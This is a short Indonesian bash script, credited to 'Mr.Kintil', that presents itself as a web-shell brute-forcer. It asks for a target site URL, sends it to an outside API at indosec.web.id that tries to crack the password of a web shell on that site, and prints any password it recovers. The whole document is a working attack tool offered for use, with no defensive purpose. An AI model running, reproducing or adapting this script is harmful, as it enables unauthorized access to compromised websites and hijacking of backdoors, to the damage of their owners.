#!/bin/bash
# THANKS ALI
# JANGAN DI RECODE GAN TOLONG YAA :D

clear;
red="\e[31m"
blue="\033[36m"
yellow="\e[93m"
NORMAL='\033[0m'
eh="echo"
printf "
 ${red}
 BRURE FORCE SHELL
 Create By : Mr.Kintil
$NORMAL
"
Data() {
echo -e "SILAHKAN MASUKKAN URL WEBNYA"
read -p "[?]=> " URL
printf $yellow"[*]LOADING.. \n"
sleep 3
curl -s "http://indosec.web.id/api/brute.php?type=shell&url=$URL" >> result_api.tmp
if [[ $(cat result_api.tmp) ]]; then
jsn=$(cat result_api.tmp | jq -r .status 2>/dev/null)
jsn3=$(cat result_api.tmp | grep -Po '(?<="password_shell":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
u=$(cat result_api.tmp | grep -Po '(?<="url":)[^,]*')
printf $NORMAL
      echo "URL => $u"
      echo "STATUS => $jsn"
      echo "CRECKED => $jsn3"
else
      echo "Erorr! => $jsn"
fi
}
Data
rm -rf result_api.tmp
